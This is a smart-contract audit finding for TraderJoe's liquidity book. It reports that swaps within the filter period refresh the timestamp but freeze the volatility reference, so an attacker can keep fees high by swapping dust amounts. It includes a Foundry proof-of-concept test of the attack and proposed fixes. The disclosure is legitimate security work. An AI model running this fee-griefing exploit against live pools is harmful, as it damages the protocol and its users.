## Tags

- bug
- 2 (Med Risk)
- primary issue
- sponsor acknowledged
- selected for report
- M-05

# [Attacker can keep fees max at no cost](https://github.com/code-423n4/2022-10-traderjoe-findings/issues/430) 

# Lines of code

https://github.com/code-423n4/2022-10-traderjoe/blob/79f25d48b907f9d0379dd803fc2abc9c5f57db93/src/libraries/FeeHelper.sol#L58-L72


# Vulnerability details

## Description

The volatile fee component in TJ is calculated using several variables, as described [here](https://docs.traderjoexyz.com/concepts/fees). Importantly, Va (volatility accumulator) = Vr (volatility reference) + binDelta:

$v_a(k) = v_r + |i_r - (activeId + k)|$


Vr is calculated depending on time passed since last swap:

$v_r = \left\{\begin{matrix}
v_r, & t<t_f  \\ 
R \cdot  v_a & t_f <= t < t_d \\ 
0, & t_d <= t
\end{matrix}\right.$

Below is the implementation:

```
function updateVariableFeeParameters(FeeParameters memory _fp, uint256 _activeId) internal view {
        uint256 _deltaT = block.timestamp - _fp.time;

        if (_deltaT >= _fp.filterPeriod || _fp.time == 0) {
            _fp.indexRef = uint24(_activeId);
            if (_deltaT < _fp.decayPeriod) {
                unchecked {
                    // This can't overflow as `reductionFactor <= BASIS_POINT_MAX`
                    _fp.volatilityReference = uint24(
                        (uint256(_fp.reductionFactor) * _fp.volatilityAccumulated) / Constants.BASIS_POINT_MAX
                    );
                }
            } else {
                _fp.volatilityReference = 0;
            }
        }

        _fp.time = (block.timestamp).safe40();

        updateVolatilityAccumulated(_fp, _activeId);
    }
```

The critical issue is that when the time since last swap is below filterPeriod, Vr does not change, yet the last swap timestamp (_fp.time) is updated. Therefore, attacker (TJ competitor) can keep fees extremely high at basically 0 cost, by swapping just under every Tf seconds, a zero-ish amount. Since Vr will forever stay the same, the calculated Va will stay high (at least Vr) and will make the protocol completely uncompetitive around the clock.

The total daily cost to the attacker would be  (TX fee (around \$0.05 on AVAX)  + swap fee (~0) ) * filterPeriodsInDay (default value is 1728) = $87.

## Impact

Attacker can make any TraderJoe pair uncompetitive at negligible cost.

## Proof of Concept

Add this test in LBPair.Fees.t.sol:

```
function testAbuseHighFeesAttack() public {
        uint256 amountY = 30e18;
        uint256 id;
        uint256 reserveX;
        uint256 reserveY;
        uint256 amountXInForSwap;
        uint256 amountYInLiquidity = 100e18;
        FeeHelper.FeeParameters memory feeParams;

        addLiquidity(amountYInLiquidity, ID_ONE, 2501, 0);

        //swap X -> Y and accrue X fees
        (amountXInForSwap,) = router.getSwapIn(pair, amountY, true);

        (reserveX,reserveY,id ) = pair.getReservesAndId();
        feeParams = pair.feeParameters();
        console.log("indexRef - start" , feeParams.indexRef);
        console.log("volatilityReference - start" , feeParams.volatilityReference);
        console.log("volatilityAccumulated - start" , feeParams.volatilityAccumulated);
        console.log("active ID - start" , id);
        console.log("reserveX - start" , reserveX);
        console.log("reserveY - start" , reserveY);

        // ATTACK step 1 - Cross many bins / wait for high volatility period
        token6D.mint(address(pair), amountXInForSwap);
        vm.prank(ALICE);
        pair.swap(true, DEV);

        (reserveX,reserveY,id ) = pair.getReservesAndId();
        feeParams = pair.feeParameters();
        console.log("indexRef - swap1" , feeParams.indexRef);
        console.log("volatilityReference - swap1" , feeParams.volatilityReference);
        console.log("volatilityAccumulated - swap1" , feeParams.volatilityAccumulated);
        console.log("active ID - swap1" , id);
        console.log("reserveX - swap1" , reserveX);
        console.log("reserveY - swap1" , reserveY);

        // ATTACK step 2 - Decay the Va into Vr
        vm.warp(block.timestamp + 99);
        token18D.mint(address(pair), 10);
        vm.prank(ALICE);
        pair.swap(false, DEV);

        (reserveX,reserveY,id ) = pair.getReservesAndId();
        console.log("active ID - swap2" , id);
        console.log("reserveX - swap2" , reserveX);
        console.log("reserveY - swap2" , reserveY);
        feeParams = pair.feeParameters();
        console.log("indexRef - swap2" , feeParams.indexRef);
        console.log("volatilityReference - swap2" , feeParams.volatilityReference);
        console.log("volatilityAccumulated - swap2" , feeParams.volatilityAccumulated);


        // ATTACK step 3 - keep high Vr -> high Va
        for(uint256 i=0;i<10;i++) {
            vm.warp(block.timestamp + 49);

            token18D.mint(address(pair), 10);
            vm.prank(ALICE);
            pair.swap(false, DEV);

            (reserveX,reserveY,id ) = pair.getReservesAndId();
            console.log("**************");
            console.log("ITERATION ", i);
            console.log("active ID" , id);
            console.log("reserveX" , reserveX);
            console.log("reserveY" , reserveY);
            feeParams = pair.feeParameters();
            console.log("indexRef" , feeParams.indexRef);
            console.log("volatilityReference" , feeParams.volatilityReference);
            console.log("volatilityAccumulated" , feeParams.volatilityAccumulated);
            console.log("**************");
        }

    }
```

## Tools Used

Manual audit, foundry

## Recommended Mitigation Steps

Several options:

1\. Decay linearly to the time since last swap when T < Tf.

2\. Don't update _tf.time if swap did not affect Vr

3\. If T<Tf, only skip Vr update if swap amount is not negligible. This will make the attack not worth it, as protocol will accrue enough fees to offset the lack of user activity.

### Severity level

I argue for HIGH severity because I believe the impact to the protocol is that most users will favor alternative AMMs, which directly translates to a large loss of revenue. AMM is known to be a very competitive market and using high volatility fee % in low volatility times will not attract any users.